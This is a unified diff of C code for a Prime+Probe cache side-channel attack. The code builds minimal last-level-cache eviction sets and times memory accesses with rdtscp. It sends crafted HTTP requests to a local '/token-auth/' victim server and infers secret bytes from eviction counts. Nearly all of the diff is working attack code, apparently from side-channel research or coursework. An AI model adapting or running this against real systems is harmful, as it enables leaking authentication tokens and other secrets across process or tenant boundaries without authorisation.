@@ -21,11 +21,11 @@
 
 // prime+probe
 #define ATTACK_RUNS 10000
-#define EVICTION_THRESHOLD 5000
+#define EVICTION_THRESHOLD 90 // L3 miss 
 #define CACHE_STRIDE 4096
 #define PROBE_SIZE (256 * 1024 * 1024)//(256 * 1024 * 1024)// 256mb
 #define PAGE_COUNT (PROBE_SIZE / HUGE_PAGE_SIZE)
-#define MAX_TIME 20000
+#define MAX_TIME 500
 // socket  volatile uint8_t tmp = *(volatile uint8_t *)curr; 
 #define PORT 8080
 #define INET "127.0.0.1"
@@ -41,7 +41,7 @@ char attack_data[256];
 
 int main(int argc, char* argv[]) {
     mlockall(MCL_CURRENT | MCL_FUTURE);
-
+    calibrate_threshold();
      // setup socket connection 
     struct sockaddr_in servaddr;
     open_socket(&clientfd, &servaddr);
@@ -51,7 +51,7 @@ int main(int argc, char* argv[]) {
     probe_arr_setup();
     //printf("Probe array base address: %p\n", (void*)probe_head);
     // threshold for classifying cache miss
-    //c_threshold = EVICTION_THRESHOLD;
+    c_threshold = EVICTION_THRESHOLD;
 
     char *baseline_data = 
     "POST /token-auth/ HTTP/1.1\r\n"
@@ -75,18 +75,19 @@ int main(int argc, char* argv[]) {
     int max = 0;
     uint8_t spiking_byte;
 
-    int byte_diff[255];
-    for (int i = 0; i < 256; i++){ // from byte 0x00 - 0xFF
+    int byte_diff[256];
+    for (int i = 67; i < 70; i++){ // from byte 0x00 - 0xFF
         int total_diff  = 0;
 
         uint8_t target_byte = (uint8_t)i;//strtoul(argv[2], NULL, 0);
         printf("\n===== EVICTION COUNT FOR BYTE %x =====\n", target_byte);
 
-        for (int r = 0; r < 1; r++){
-            node_t *probe_arr = build_linked_list(target_byte);
-            if (probe_arr == NULL){
-                continue;
-            }
+        node_t *probe_arr = build_linked_list(target_byte);
+        while(probe_arr == NULL){
+            probe_arr = build_linked_list(target_byte);
+        }
+    
+        for (int r = 0; r < 3; r++){
 
             int baseline_count = 0;
             int attack_count = 0;
@@ -128,6 +129,7 @@ int main(int argc, char* argv[]) {
                 printf("threshold used: %ld\n", c_threshold);
             }
         }
+        printf("TOTAL DIFF (%d)", total_diff);
         byte_diff[i] = total_diff;
         if (total_diff > max){
             max = total_diff;
@@ -135,7 +137,7 @@ int main(int argc, char* argv[]) {
         }
         usleep(0);
     }   
-    byte_histogram(&byte_diff);
+    byte_histogram(byte_diff);
     printf("\nLargest Spike Byte: %x (%d)\n", spiking_byte, max);
 
     close(clientfd);
@@ -168,27 +170,195 @@ node_t* build_linked_list(uint8_t target_byte){
         byte_addresses[p] = addr;
     }
 
-    // shuffle to trick prefetcher
-    for(int i = 0; i < PAGE_COUNT; i++){
-        node_t *tmp = byte_addresses[i];
-        int shuffle_index = rand() % PAGE_COUNT;
-        // swap
-        byte_addresses[i] = byte_addresses[shuffle_index];
-        byte_addresses[shuffle_index] = tmp;
+    node_t *eviction_set = get_perfect_eviction_set(byte_addresses);
+    
+    return eviction_set;
+}
+
+// gets tge perfect eviction set to fill the victims set
+node_t* get_perfect_eviction_set(node_t **address_pool){
+    node_t *current_set[PAGE_COUNT];
+    int current_count  = 0;
+    int tries = 0;
+    while (1){
+        // get random address to be target
+        int target_index = rand() % PAGE_COUNT;
+        node_t *target = address_pool[target_index];
+        
+        // get 16 random initial addresses
+        current_count = 0;
+        while(current_count < 16){
+            int index = rand() % PAGE_COUNT;
+            node_t *candidate = address_pool[index];
+            if (candidate != target && !address_in_set(candidate, current_set, current_count)){
+                current_set[current_count] = candidate;
+                current_count ++;
+            }
+        }
+
+        // test current set
+        if(full_test_set(target, current_set, current_count) == 1){
+            //printf("PERFECT SET FOUND FIRST TIME\n"); 
+            for(int i = 0; i < current_count-1; i++){
+                current_set[i]->next = current_set[i+1];
+            }
+            current_set[current_count-1]->next = NULL;
+            return current_set[0]; // if perfect return - unlikely 
+        }
+
+        // expand current set until it works
+        int index = 0;
+        while(full_test_set(target, current_set, current_count) == 0 && current_count != PAGE_COUNT-1){
+            node_t *candidate = address_pool[index];
+            if (candidate != target && !address_in_set(candidate, current_set, current_count)){
+                current_set[current_count] = candidate;
+                current_count ++;
+            }
+            index ++;
+        }
+        if (current_count==PAGE_COUNT-1){
+            //printf("nothing useful at all for this target address\n");
+            return NULL;
+        }
+
+        while(current_count > 16){
+            // shrink set 
+            if (current_count <=16){
+                break;
+            }
+
+            for (int i = 0; i < current_count; ) {
+                if (current_count <=16){
+                    break;
+                }
+                // remove an address
+                node_t *removed_candidate = current_set[i];
+                current_set[i] = current_set[current_count - 1]; // replace removed elemetn with elemnt at the end
+                current_count--;
+                // test new set
+                if (full_test_set(target, current_set, current_count) == 0){
+                    // re-add it to the set, was needed
+                    current_count++;
+                    current_set[current_count-1] = current_set[i];
+                    current_set[i] = removed_candidate;
+
+                    i++;
+                }
+            }
+        }
+        // link final set
+        shuffle(current_set, current_count);
+        for (int i = 0; i < current_count - 1; i++){
+            current_set[i]->next = current_set[i+1];
+        }
+        current_set[current_count - 1]->next = NULL;
+
+        if(is_set_useful(current_set[0])){
+            break;
+        }
+        if(tries >= 5){
+            return NULL;
+        }
+        
+        tries ++;
     }
 
-    // link the pointer chain 
-    for (int i = 0; i < PAGE_COUNT-1; i++){
-        byte_addresses[i]->next = byte_addresses[i+1];
+    printf("Reduction complete. Minimal viable set size: %d\n", current_count);
+
+
+    return current_set[0];
+}
+
+int is_set_useful(node_t *current_set){
+    int evictions = 0;
+    for (int i = 0; i < 10; i++){ 
+        // prime
+        prime_cache(current_set);
+
+        // send to victim
+        send(clientfd, attack_data, strlen(attack_data), 0);
+        recv(clientfd, buf, sizeof(buf), 0); 
+        _mm_mfence();
+
+        // probe
+        unsigned int pid;
+        node_t *current = current_set;
+        
+        while (current != NULL){
+            uint64_t t1 = __rdtscp(&pid);
+            _mm_lfence();
+            volatile uint8_t tmp = *(volatile uint8_t *)current;
+            _mm_lfence();
+            uint64_t t2 = __rdtscp(&pid);
+            
+            if ((t2 - t1) > c_threshold){
+                evictions++;
+            }
+            current = current->next;
+            _mm_lfence();
+        }
     }
-    byte_addresses[PAGE_COUNT-1]->next = NULL;
+    if(evictions > 4){
+        printf("This eviction set had %d evictions\n", evictions);
+        return 1;
+    }
+    return 0;
 
-    //uint64_t smart_thresh = avg_hit_time(byte_addresses[0]);
+}
 
-    c_threshold = 260;
-    //printf("THRESHOLD: %ld\n", c_threshold);
-    // return start of pointer chain
-    return byte_addresses[0];
+
+int full_test_set(node_t *target, node_t **current_set, int current_count){
+    int target_evictions = 0;
+    for (int i = 0; i < 10; i++){ 
+        target_evictions += test_set(target, current_set, current_count);
+    }
+    if(target_evictions == 0){
+        return 0; // target was never evicted, set broken
+    }
+    return 1; // target evicted
+}
+
+int test_set(node_t *target, node_t **current_set, int current_count){
+    // shuffle + build linked list
+    shuffle(current_set, current_count);
+    for (int i = 0; i < current_count-1; i++){
+        current_set[i]->next = current_set[i+1];
+    }
+    current_set[current_count-1]->next = NULL;
+
+    node_t *head = current_set[0];
+    // prime
+    prime_cache(head);
+    // trigger target
+    volatile uint8_t *tmp = (volatile uint8_t *)target;
+    *tmp;
+    _mm_mfence();
+
+    //re-prime
+    prime_cache(head);
+
+    // probe target
+    unsigned int junk;
+    uint64_t t1 = __rdtscp(&junk);
+    _mm_lfence();
+    volatile uint8_t dummy = *tmp; 
+    _mm_lfence();
+    uint64_t t2 = __rdtscp(&junk);
+
+    // check if target evicted
+    if ((t2 - t1) > c_threshold && (t2-t1) < MAX_TIME) {
+        return 1; // eviction set useful
+    }
+    return 0;   // target was not evicted
+}
+
+int address_in_set(node_t *address, node_t **current_set, int current_count){
+    for(int i = 0; i < current_count; i++){
+        if(address == current_set[i]){
+            return 1; // address already in current set
+        }
+    }
+    return 0;
 }
 
 // Prime LLC
@@ -208,8 +378,6 @@ void check_cache_presence(node_t *base_ptr, int *result){
     unsigned int pid;
     node_t *current = base_ptr;
     int evictions = 0;
-    
-    _mm_mfence();
     
     while (current != NULL){
         uint64_t t1 = __rdtscp(&pid);
@@ -262,18 +430,19 @@ void open_socket(int *clientfd, struct sockaddr_in *servaddr){
 }
 
 
-void shuffle(int shuffle_arr[]){
-    for (int i = 0; i < LLC_SETS; i++){
-        int tmp = shuffle_arr[i];
-        int shuffle_index = rand() % LLC_SETS;
-        shuffle_arr[i] = shuffle_arr[shuffle_index];
-        shuffle_arr[shuffle_index] = tmp;
+void shuffle(node_t **items, int item_count){
+    for(int i = item_count - 1; i > 0; i--){
+        node_t *tmp = items[i];
+        int shuffle_index = rand() % (i+1);
+        // swap
+        items[i] = items[shuffle_index];
+        items[shuffle_index] = tmp;
     }
 }
 
 void byte_histogram(int *byte_diffs){
     printf("\n========== CACHE HIT HISTOGRAM ==========\n");
-    for (int i = 0; i < 256; i++){ 
+    for (int i = 67; i < 70; i++){ 
         int noBars = byte_diffs[i]/10;
         printf("0x%02x | ", i);
         for (int k = 0; k < noBars; k++) {
